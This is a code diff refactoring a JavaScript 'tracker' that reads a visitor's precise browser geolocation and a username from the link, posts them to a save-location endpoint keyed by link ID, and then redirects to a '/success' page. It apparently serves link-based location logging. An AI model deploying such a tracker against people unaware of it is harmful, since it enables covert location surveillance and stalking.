@@ -1,28 +1,28 @@
-function sendData(linkId, latitude, longitude) {
-  fetch('/api/save-location/' + linkId, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      latitude: latitude,
-      longitude: longitude
-    })
-  })
-  .then(() => { window.location.href = '/success'; })
-  .catch(() => { window.location.href = '/success'; });
-}
-
 function initTracker(linkId) {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      (position) => {
-        sendData(linkId, position.coords.latitude, position.coords.longitude);
-      },
-      (error) => {
-        sendData(linkId, null, null);
-      },
-      { timeout: 5000, enableHighAccuracy: true }
-    );
-  } else {
-    sendData(linkId, null, null);
-  }
+    const urlParams = new URLSearchParams(window.location.search);
+    const username = urlParams.get('user') || 'Guest_' + Math.floor(1000 + Math.random() * 9000);
+
+    function sendData(lat, lon) {
+        fetch('/api/save-location/' + linkId, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                username: username,
+                latitude: lat,
+                longitude: lon
+            })
+        }).finally(() => {
+            window.location.href = '/success';
+        });
+    }
+
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => sendData(pos.coords.latitude, pos.coords.longitude),
+            () => sendData(null, null),
+            { timeout: 3000, enableHighAccuracy: true }
+        );
+    } else {
+        sendData(null, null);
+    }
 }
